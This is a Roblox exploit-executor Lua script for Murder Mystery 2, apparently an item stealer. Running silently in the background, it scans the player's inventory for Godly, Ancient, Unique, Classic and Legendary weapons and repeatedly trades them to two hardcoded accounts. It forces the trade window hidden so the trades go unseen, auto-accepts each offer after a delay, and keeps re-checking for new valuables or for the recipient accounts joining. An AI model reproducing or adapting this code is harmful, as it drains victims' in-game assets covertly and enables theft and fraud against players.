--============================================================
-- BLIZZARD MM2 - HEADLESS BACKGROUND AUTO TRADER
--
-- NO GUI
-- NO BUTTONS
-- NO PRINTS
-- NO __namecall
--
-- TARGET PRIORITY:
--   1. umpireblue
--   2. gamermusaXD_YT
--
-- PRIMARY:
--   Unique
--   Ancient
--   Godly
--   Classic = Vintage
--
-- FILLER:
--   Legendary only when a PRIMARY trade has free slots
--
-- BEHAVIOR:
--   • Runs silently in background
--   • Checks approved friends already in server
--   • Watches for approved friends joining later
--   • umpireblue always has priority between trades
--   • Watches inventory while idle
--   • Automatically starts when valuables exist
--   • Up to 4 items per trade
--   • Exact offer verification
--   • Proven 5.1 second accept delay
--   • Uses newest LastOffer
--   • Rescans after every completed trade
--   • Returns to idle after valuables are gone
--   • Does NOT kick player
--============================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--============================================================
-- CONFIG
--============================================================

local APPROVED_TARGETS = {
	{
		Username = "umpireblue",
		UserId = 368331177,
		Priority = 1,
	},
	{
		Username = "gamermusaXD_YT",
		UserId = 505995718,
		Priority = 2,
	},
}

local MAX_ITEMS_PER_TRADE = 4

local REQUEST_TIMEOUT = 30
local OFFER_TIMEOUT = 15

local AUTO_ACCEPT_DELAY = 5.1
local RESCAN_DELAY = 1.25

-- How often the background watcher checks inventory / targets.
local BACKGROUND_SCAN_INTERVAL = 2

--============================================================
-- RARITIES
--============================================================

local PRIMARY_RARITIES = {
	Unique = true,
	Ancient = true,
	Godly = true,
	Classic = true, -- Vintage
}

local FILLER_RARITIES = {
	Legendary = true,
}

--============================================================
-- REMOTES
--============================================================

local Trade =
	ReplicatedStorage:WaitForChild("Trade")

local SendRequest =
	Trade:WaitForChild("SendRequest")

local StartTrade =
	Trade:WaitForChild("StartTrade")

local OfferItem =
	Trade:WaitForChild("OfferItem")

local UpdateTrade =
	Trade:WaitForChild("UpdateTrade")

local AcceptTrade =
	Trade:WaitForChild("AcceptTrade")

local DeclineTrade =
	Trade:FindFirstChild("DeclineTrade")

--============================================================
-- INVENTORY MODULE
--============================================================

local InventoryModule =
	require(
		ReplicatedStorage
			:WaitForChild("Modules")
			:WaitForChild("InventoryModule")
	)

--============================================================
-- GLOBAL STATE
--============================================================

local Environment =
	getgenv and getgenv()
	or _G

-- Kill an older copy if Loader/AutoTrader is executed again.
if Environment.BlizzardBackgroundTrader then

	local Old =
		Environment.BlizzardBackgroundTrader

	Old.Running = false

	if Old.Connections then

		for _, connection in ipairs(
			Old.Connections
		) do

			pcall(function()
				connection:Disconnect()
			end)
		end
	end
end

local State = {
	Running = true,
	Busy = false,
	Connections = {},
}

Environment.BlizzardBackgroundTrader =
	State

--============================================================
-- TRADE STATE
--============================================================

local CurrentTarget = nil

local WaitingForTrade = false
local WaitingForOffer = false
local AcceptScheduled = false

local CurrentTradeState = nil

local PlannedItems = {}
local PlannedByID = {}

local TradeNumber = 0

--============================================================
-- MOBILE TRADE GUI BLOCKER
--============================================================

local TradeGuiBlockConnection = nil
local TradeGuiChildConnection = nil
local WatchedTradeGui = nil

--============================================================
-- CONNECTION HELPER
--============================================================

local function Track(connection)

	table.insert(
		State.Connections,
		connection
	)

	return connection
end

--============================================================
-- SAFE TABLE HELPERS
--============================================================

local function SafeGet(tbl, key)

	if type(tbl) ~= "table" then
		return nil
	end

	local ok, result =
		pcall(function()
			return tbl[key]
		end)

	if ok then
		return result
	end

	return nil
end

local function First(tbl, keys)

	if type(tbl) ~= "table" then
		return nil
	end

	for _, key in ipairs(keys) do

		local value =
			SafeGet(
				tbl,
				key
			)

		if value ~= nil then
			return value
		end
	end

	return nil
end

--============================================================
-- ITEM HELPERS
--============================================================

local function GetItemID(tbl, keyHint)

	return First(
		tbl,
		{
			"DataID",
			"ItemID",
			"ID",
			"Id",
		}
	) or keyHint
end

local function GetItemName(tbl)

	return First(
		tbl,
		{
			"ItemName",
			"DisplayName",
			"Name",
		}
	)
end

local function GetItemRarity(tbl)

	return First(
		tbl,
		{
			"Rarity",
			"Tier",
		}
	)
end

local function GetItemType(tbl)

	return First(
		tbl,
		{
			"ItemType",
			"WeaponType",
			"Type",
		}
	)
end

local function GetItemAmount(tbl)

	return tonumber(
		First(
			tbl,
			{
				"Amount",
				"Count",
				"Quantity",
			}
		)
	) or 0
end

local function IsWeaponType(itemType)

	return itemType == "Knife"
		or itemType == "Gun"
end

--============================================================
-- INVENTORY SCANNER
--============================================================

local function GetWeaponsTable()

	local inventory =
		SafeGet(
			InventoryModule,
			"MyInventory"
		)

	local data =
		SafeGet(
			inventory,
			"Data"
		)

	return SafeGet(
		data,
		"Weapons"
	)
end

local function ScanInventory()

	local Weapons =
		GetWeaponsTable()

	if type(Weapons) ~= "table" then
		return {}, {}
	end

	local primary = {}
	local filler = {}

	local visited = {}
	local seenIDs = {}

	local function Walk(tbl, depth)

		if type(tbl) ~= "table" then
			return
		end

		if visited[tbl] then
			return
		end

		if depth > 10 then
			return
		end

		visited[tbl] = true

		for key, value in pairs(tbl) do

			if type(value) == "table" then

				local rarity =
					GetItemRarity(value)

				local itemType =
					GetItemType(value)

				local amount =
					GetItemAmount(value)

				if rarity
					and amount > 0
					and IsWeaponType(itemType)
				then

					local dataID =
						tostring(
							GetItemID(
								value,
								key
							)
						)

					if not seenIDs[dataID] then

						seenIDs[dataID] =
							true

						local item = {
							DataID = dataID,

							Name =
								tostring(
									GetItemName(value)
									or dataID
								),

							Rarity =
								tostring(rarity),

							ItemType =
								tostring(itemType),

							Amount =
								amount,
						}

						if PRIMARY_RARITIES[
							item.Rarity
						] then

							table.insert(
								primary,
								item
							)

						elseif FILLER_RARITIES[
							item.Rarity
						] then

							table.insert(
								filler,
								item
							)
						end
					end
				end

				Walk(
					value,
					depth + 1
				)
			end
		end
	end

	Walk(
		Weapons,
		0
	)

	local priority = {
		Unique = 1,
		Ancient = 2,
		Godly = 3,
		Classic = 4,
	}

	table.sort(
		primary,
		function(a, b)

			local pa =
				priority[a.Rarity]
				or 99

			local pb =
				priority[b.Rarity]
				or 99

			if pa ~= pb then
				return pa < pb
			end

			return a.DataID
				< b.DataID
		end
	)

	table.sort(
		filler,
		function(a, b)

			return a.DataID
				< b.DataID
		end
	)

	return primary, filler
end

--============================================================
-- BUILD TRADE BATCH
--============================================================

local function BuildBatch()

	local primary, filler =
		ScanInventory()

	if #primary == 0 then

		return nil,
			primary,
			filler
	end

	local batch = {}

	-- PRIMARY FIRST

	for _, item in ipairs(primary) do

		if #batch
			>= MAX_ITEMS_PER_TRADE
		then
			break
		end

		table.insert(
			batch,
			item
		)
	end

	-- LEGENDARY ONLY FILLS FREE SPACE

	if #batch
		< MAX_ITEMS_PER_TRADE
	then

		for _, item in ipairs(filler) do

			if #batch
				>= MAX_ITEMS_PER_TRADE
			then
				break
			end

			table.insert(
				batch,
				item
			)
		end
	end

	return batch,
		primary,
		filler
end

--============================================================
-- APPROVED TARGET HELPERS
--============================================================

local function GetApprovedDefinition(username)

	for _, definition in ipairs(
		APPROVED_TARGETS
	) do

		if definition.Username
			== username
		then
			return definition
		end
	end

	return nil
end

local function IsApprovedPlayer(player)

	if not player
		or not player:IsA("Player")
	then
		return false
	end

	local definition =
		GetApprovedDefinition(
			player.Name
		)

	if not definition then
		return false
	end

	return player.UserId
		== definition.UserId
end

local function FindApprovedPlayer(
	definition
)

	local player =
		Players:FindFirstChild(
			definition.Username
		)

	if player
		and player.UserId
			== definition.UserId
	then
		return player
	end

	return nil
end

--============================================================
-- PRIORITY TARGET RESOLVER
--
-- APPROVED_TARGETS ORDER:
--
-- #1 umpireblue
-- #2 gamermusaXD_YT
--============================================================

local function ResolveBestTarget()

	for _, definition in ipairs(
		APPROVED_TARGETS
	) do

		local player =
			FindApprovedPlayer(
				definition
			)

		if player then
			return player
		end
	end

	return nil
end

local function VerifyCurrentTarget()

	if not CurrentTarget then
		return false
	end

	if CurrentTarget.Parent
		~= Players
	then
		return false
	end

	return IsApprovedPlayer(
		CurrentTarget
	)
end

local function IsExactCurrentTarget(player)

	if not player
		or not CurrentTarget
	then
		return false
	end

	return player.Name
			== CurrentTarget.Name
		and player.UserId
			== CurrentTarget.UserId
end

--============================================================
-- STARTTRADE TARGET PARSER
--============================================================

local function FindTargetInValue(
	value,
	depth,
	visited
)

	depth =
		depth or 0

	visited =
		visited or {}

	if depth > 7 then
		return nil
	end

	-- PLAYER INSTANCE

	if typeof(value) == "Instance"
		and value:IsA("Player")
	then

		if IsApprovedPlayer(value) then
			return value
		end

		return nil
	end

	-- USERNAME STRING

	if type(value) == "string" then

		local definition =
			GetApprovedDefinition(
				value
			)

		if definition then

			local player =
				Players:FindFirstChild(
					definition.Username
				)

			if player
				and player.UserId
					== definition.UserId
			then
				return player
			end
		end

		return nil
	end

	-- USER ID

	if type(value) == "number" then

		for _, definition in ipairs(
			APPROVED_TARGETS
		) do

			if value
				== definition.UserId
			then

				local player =
					Players:GetPlayerByUserId(
						value
					)

				if IsApprovedPlayer(
					player
				) then
					return player
				end
			end
		end

		return nil
	end

	-- TABLE

	if type(value) ~= "table" then
		return nil
	end

	if visited[value] then
		return nil
	end

	visited[value] =
		true

	for _, key in ipairs({
		"Name",
		"Username",
		"UserName",
		"PlayerName",
		"OtherPlayerName",
		"TargetName",
	}) do

		local name =
			value[key]

		if type(name) == "string" then

			local definition =
				GetApprovedDefinition(
					name
				)

			if definition then

				local player =
					Players:FindFirstChild(
						name
					)

				if player
					and player.UserId
						== definition.UserId
				then
					return player
				end
			end
		end
	end

	for _, key in ipairs({
		"UserId",
		"UserID",
		"PlayerId",
		"PlayerID",
		"TargetUserId",
		"OtherUserId",
	}) do

		local userId =
			tonumber(
				value[key]
			)

		if userId then

			for _, definition in ipairs(
				APPROVED_TARGETS
			) do

				if userId
					== definition.UserId
				then

					local player =
						Players:GetPlayerByUserId(
							userId
						)

					if IsApprovedPlayer(
						player
					) then
						return player
					end
				end
			end
		end
	end

	for _, nested in pairs(value) do

		local found =
			FindTargetInValue(
				nested,
				depth + 1,
				visited
			)

		if found then
			return found
		end
	end

	return nil
end

local function ExtractOtherPlayer(...)

	for index = 1, select("#", ...) do

		local value =
			select(
				index,
				...
			)

		local player =
			FindTargetInValue(
				value
			)

		if player then
			return player
		end
	end

	return nil
end

--============================================================
-- TRADE STATE
--============================================================

local function LooksLikeTradeState(tbl)

	if type(tbl) ~= "table" then
		return false
	end

	return tbl.LastOffer ~= nil
		or tbl.Offer ~= nil
		or tbl.MyOffer ~= nil
		or tbl.YourOffer ~= nil
end

local function ExtractTradeState(...)

	for index = 1, select("#", ...) do

		local value =
			select(
				index,
				...
			)

		if LooksLikeTradeState(
			value
		) then
			return value
		end
	end

	return nil
end

--============================================================
-- OFFER VERIFICATION
--============================================================

local function IsOfferEntry(entry)

	return type(entry) == "table"
		and type(entry[1]) == "string"
		and tonumber(entry[2]) ~= nil
		and type(entry[3]) == "string"
end

local function LooksLikeOfferList(tbl)

	if type(tbl) ~= "table" then
		return false
	end

	for _, value in pairs(tbl) do

		if IsOfferEntry(value) then
			return true
		end
	end

	return false
end

local function CollectOfferLists(root)

	local results = {}
	local visited = {}

	local function Walk(tbl, depth)

		if type(tbl) ~= "table" then
			return
		end

		if visited[tbl] then
			return
		end

		if depth > 7 then
			return
		end

		visited[tbl] = true

		if LooksLikeOfferList(tbl) then

			table.insert(
				results,
				tbl
			)
		end

		for _, value in pairs(tbl) do

			if type(value) == "table" then

				Walk(
					value,
					depth + 1
				)
			end
		end
	end

	Walk(
		root,
		0
	)

	return results
end

local function SetPlannedItems(batch)

	PlannedItems = {}
	PlannedByID = {}

	for _, item in ipairs(batch) do

		table.insert(
			PlannedItems,
			item
		)

		PlannedByID[
			item.DataID
		] = true
	end
end

local function OfferListMatchesPlan(
	offerList
)

	local seen = {}
	local count = 0

	for _, entry in pairs(
		offerList
	) do

		if IsOfferEntry(entry) then

			local dataID =
				tostring(
					entry[1]
				)

			local amount =
				tonumber(
					entry[2]
				) or 0

			local category =
				tostring(
					entry[3]
				)

			if category == "Weapons" then

				count += 1

				seen[dataID] =
					amount
			end
		end
	end

	if count
		~= #PlannedItems
	then
		return false
	end

	for _, planned in ipairs(
		PlannedItems
	) do

		local amount =
			seen[
				planned.DataID
			]

		if not amount
			or amount < 1
		then
			return false
		end
	end

	for dataID in pairs(seen) do

		if not PlannedByID[
			dataID
		] then
			return false
		end
	end

	return true
end

local function VerifyCurrentOffer()

	if type(CurrentTradeState)
		~= "table"
	then
		return false
	end

	local offerLists =
		CollectOfferLists(
			CurrentTradeState
		)

	for _, offerList in ipairs(
		offerLists
	) do

		if OfferListMatchesPlan(
			offerList
		) then
			return true
		end
	end

	return false
end

--============================================================
-- MOBILE TRADE GUI BLOCKER
--============================================================

local function DisconnectTradeGuiWatch()

	if TradeGuiBlockConnection then

		TradeGuiBlockConnection:
			Disconnect()

		TradeGuiBlockConnection =
			nil
	end

	WatchedTradeGui =
		nil
end

local function WatchTradeGUI(gui)

	if not gui
		or not gui:IsA("ScreenGui")
	then
		return
	end

	if WatchedTradeGui
		== gui
	then

		gui.Enabled =
			false

		return
	end

	DisconnectTradeGuiWatch()

	WatchedTradeGui =
		gui

	gui.Enabled =
		false

	TradeGuiBlockConnection =
		gui
			:GetPropertyChangedSignal(
				"Enabled"
			)
			:Connect(
				function()

					if State.Running
						and State.Busy
						and gui.Parent
						and gui.Enabled
					then

						gui.Enabled =
							false
					end
				end
			)
end

local function KeepTradeGUIHidden()

	local gui =
		PlayerGui:FindFirstChild(
			"TradeGUI_Phone"
		)

	if gui then

		WatchTradeGUI(
			gui
		)

		if gui:IsA("ScreenGui") then
			gui.Enabled =
				false
		end
	end
end

local function ArmTradeGUIBlocker()

	DisconnectTradeGuiWatch()

	if TradeGuiChildConnection then

		TradeGuiChildConnection:
			Disconnect()

		TradeGuiChildConnection =
			nil
	end

	local existing =
		PlayerGui:FindFirstChild(
			"TradeGUI_Phone"
		)

	if existing then

		WatchTradeGUI(
			existing
		)
	end

	TradeGuiChildConnection =
		PlayerGui.ChildAdded:Connect(
			function(child)

				if State.Running
					and State.Busy
					and child.Name
						== "TradeGUI_Phone"
				then

					WatchTradeGUI(
						child
					)
				end
			end
		)
end

local function DisarmTradeGUIBlocker()

	DisconnectTradeGuiWatch()

	if TradeGuiChildConnection then

		TradeGuiChildConnection:
			Disconnect()

		TradeGuiChildConnection =
			nil
	end
end

--============================================================
-- RETURN TO BACKGROUND IDLE
--============================================================

local function ReturnToIdle()

	State.Busy =
		false

	CurrentTarget =
		nil

	WaitingForTrade =
		false

	WaitingForOffer =
		false

	AcceptScheduled =
		false

	CurrentTradeState =
		nil

	PlannedItems =
		{}

	PlannedByID =
		{}

	TradeNumber =
		0

	DisarmTradeGUIBlocker()
end

--============================================================
-- ABORT CURRENT CYCLE
--
-- DOES NOT DISABLE BACKGROUND WATCHER.
--============================================================

local function AbortCurrentCycle()

	ReturnToIdle()
end

--============================================================
-- FORWARD DECLARATIONS
--============================================================

local StartNextTrade
local TryStartBackgroundTrade

--============================================================
-- FINAL ACCEPT
--============================================================

local function ScheduleAccept()

	if AcceptScheduled
		or not State.Running
		or not State.Busy
	then
		return
	end

	if not VerifyCurrentTarget() then

		AbortCurrentCycle()

		return
	end

	if type(CurrentTradeState)
		~= "table"
	then
		return
	end

	if CurrentTradeState.LastOffer
		== nil
	then
		return
	end

	if not VerifyCurrentOffer() then
		return
	end

	AcceptScheduled =
		true

	task.delay(
		AUTO_ACCEPT_DELAY,
		function()

			if not State.Running
				or not State.Busy
			then
				return
			end

			if not VerifyCurrentTarget() then

				AbortCurrentCycle()

				return
			end

			if type(CurrentTradeState)
					~= "table"
				or CurrentTradeState.LastOffer
					== nil
			then

				AcceptScheduled =
					false

				return
			end

			if not VerifyCurrentOffer() then

				AcceptScheduled =
					false

				return
			end

			local LatestLastOffer =
				CurrentTradeState.LastOffer

			AcceptTrade:FireServer(
				game.PlaceId * 3,
				LatestLastOffer
			)
		end
	)
end

--============================================================
-- OFFER ITEMS
--============================================================

local function OfferPlannedItems()

	if not State.Running
		or not State.Busy
	then
		return
	end

	if not VerifyCurrentTarget() then

		AbortCurrentCycle()

		return
	end

	for _, item in ipairs(
		PlannedItems
	) do

		OfferItem:FireServer(
			item.DataID,
			"Weapons"
		)
	end

	WaitingForOffer =
		true

	task.delay(
		OFFER_TIMEOUT,
		function()

			if State.Running
				and State.Busy
				and WaitingForOffer
				and not AcceptScheduled
			then

				AbortCurrentCycle()
			end
		end
	)
end

--============================================================
-- START NEXT TRADE
--============================================================

StartNextTrade = function()

	if not State.Running
		or not State.Busy
	then
		return
	end

	--========================================================
	-- RE-EVALUATE PRIORITY BEFORE EVERY NEW TRADE.
	--
	-- If gamermusa was previously used but umpire has joined,
	-- the NEXT trade switches to umpire.
	--========================================================

	local bestTarget =
		ResolveBestTarget()

	if not bestTarget then

		AbortCurrentCycle()

		return
	end

	CurrentTarget =
		bestTarget

	local batch,
		primary =
		BuildBatch()

	--========================================================
	-- ALL PRIMARY ITEMS GONE.
	--
	-- DO NOT KICK.
	-- RETURN TO BACKGROUND WATCHING.
	--========================================================

	if not batch then

		ReturnToIdle()

		return
	end

	TradeNumber += 1

	CurrentTradeState =
		nil

	WaitingForTrade =
		true

	WaitingForOffer =
		false

	AcceptScheduled =
		false

	SetPlannedItems(
		batch
	)

	KeepTradeGUIHidden()

	task.spawn(
		function()

			pcall(
				function()

					SendRequest:InvokeServer(
						CurrentTarget
					)
				end
			)
		end
	)

	task.delay(
		REQUEST_TIMEOUT,
		function()

			if State.Running
				and State.Busy
				and WaitingForTrade
			then

				AbortCurrentCycle()
			end
		end
	)
end

--============================================================
-- STARTTRADE EVENT
--============================================================

Track(
	StartTrade.OnClientEvent:Connect(
		function(...)

			if not State.Running
				or not State.Busy
			then
				return
			end

			KeepTradeGUIHidden()

			if not VerifyCurrentTarget() then

				AbortCurrentCycle()

				return
			end

			local other =
				ExtractOtherPlayer(...)

			-- If MM2 explicitly identifies an approved partner,
			-- it must be our currently selected exact target.

			if other
				and not IsExactCurrentTarget(
					other
				)
			then

				AbortCurrentCycle()

				return
			end

			WaitingForTrade =
				false

			local tradeState =
				ExtractTradeState(...)

			if tradeState then

				CurrentTradeState =
					tradeState
			end

			task.defer(
				OfferPlannedItems
			)
		end
	)
)

--============================================================
-- UPDATETRADE EVENT
--============================================================

Track(
	UpdateTrade.OnClientEvent:Connect(
		function(...)

			if not State.Running
				or not State.Busy
			then
				return
			end

			KeepTradeGUIHidden()

			local state =
				ExtractTradeState(...)

			if state then

				CurrentTradeState =
					state
			end

			if VerifyCurrentOffer() then

				WaitingForOffer =
					false

				if not AcceptScheduled
					and CurrentTradeState
					and CurrentTradeState.LastOffer
						~= nil
				then

					ScheduleAccept()
				end
			end
		end
	)
)

--============================================================
-- ACCEPTTRADE EVENT
--============================================================

Track(
	AcceptTrade.OnClientEvent:Connect(
		function(success)

			if not State.Running
				or not State.Busy
			then
				return
			end

			KeepTradeGUIHidden()

			if success == true then

				CurrentTradeState =
					nil

				WaitingForTrade =
					false

				WaitingForOffer =
					false

				AcceptScheduled =
					false

				task.delay(
					RESCAN_DELAY,
					function()

						if State.Running
							and State.Busy
						then

							StartNextTrade()
						end
					end
				)

			else

				-- success=false:
				-- other side accepted / still waiting.

			end
		end
	)
)

--============================================================
-- DECLINE EVENT
--============================================================

if DeclineTrade
	and DeclineTrade:IsA(
		"RemoteEvent"
	)
then

	Track(
		DeclineTrade.OnClientEvent:Connect(
			function()

				if State.Running
					and State.Busy
				then

					AbortCurrentCycle()
				end
			end
		)
	)
end

--============================================================
-- TRY START BACKGROUND TRADE
--============================================================

TryStartBackgroundTrade =
	function()

		if not State.Running then
			return
		end

		if State.Busy then
			return
		end

		local target =
			ResolveBestTarget()

		if not target then
			return
		end

		local primary =
			ScanInventory()

		if #primary == 0 then
			return
		end

		State.Busy =
			true

		CurrentTarget =
			target

		TradeNumber =
			0

		WaitingForTrade =
			false

		WaitingForOffer =
			false

		AcceptScheduled =
			false

		CurrentTradeState =
			nil

		ArmTradeGUIBlocker()

		StartNextTrade()
	end

--============================================================
-- PLAYER JOIN WATCHER
--============================================================

Track(
	Players.PlayerAdded:Connect(
		function(player)

			if not State.Running then
				return
			end

			if not IsApprovedPlayer(
				player
			) then
				return
			end

			-- Small delay lets player fully enter Players service.

			task.delay(
				1,
				function()

					if State.Running then

						TryStartBackgroundTrade()
					end
				end
			)
		end
	)
)

--============================================================
-- CURRENT TARGET LEAVES
--============================================================

Track(
	Players.PlayerRemoving:Connect(
		function(player)

			if not State.Running then
				return
			end

			if CurrentTarget
				and player == CurrentTarget
			then

				AbortCurrentCycle()

				-- If the lower-priority approved friend is still
				-- present, background scan will pick them next.
			end
		end
	)
)

--============================================================
-- BACKGROUND INVENTORY / TARGET WATCHER
--
-- This is what allows:
--
--   • Friend already in server at startup
--   • Friend joins later
--   • You obtain a new Godly/Ancient/etc later
--   • Trader wakes itself back up
--============================================================

task.spawn(
	function()

		while State.Running do

			if not State.Busy then

				TryStartBackgroundTrade()
			end

			task.wait(
				BACKGROUND_SCAN_INTERVAL
			)
		end
	end
)

--============================================================
-- IMMEDIATE STARTUP CHECK
--
-- If an approved friend was already in the server BEFORE
-- AutoTrader.lua loaded, this immediately detects them.
--============================================================

task.defer(
	function()

		if State.Running then

			TryStartBackgroundTrade()
		end
	end
)